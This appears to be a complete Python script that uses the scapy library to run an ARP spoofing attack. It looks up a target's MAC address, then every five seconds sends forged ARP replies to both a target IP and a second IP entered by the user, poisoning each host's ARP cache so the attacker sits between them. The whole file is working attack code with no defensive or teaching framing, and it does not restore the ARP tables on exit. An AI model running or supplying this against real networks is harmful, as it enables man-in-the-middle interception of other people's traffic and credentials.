import scapy.all as scapy
import time
import sys
def Get_MAC(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    result = scapy.srp(broadcast/arp_request, verbose=False, timeout=3)[0]
    if result[0][1].psrc == IP:
        return result[0][1].hwsrc #It is a list of one list item
def Spoofing(Target_IP, Spoof_IP):
    Target_MAC = Get_MAC(Target_IP)
    ARP_Packet = scapy.ARP(op=2, pdst=Target_IP, hwdst = Target_MAC,psrc = Spoof_IP)
    scapy.send(ARP_Packet, verbose=False)

TargetIP= input("Target IP: ")
SpoofIP = input("Spoofed IP: ")
while True:
    try:
        while True:   
            Spoofing(TargetIP, SpoofIP)
            Spoofing(SpoofIP, TargetIP)
            time.sleep(5)
    except Exception as e:
            print(e)
            sys.exit(1)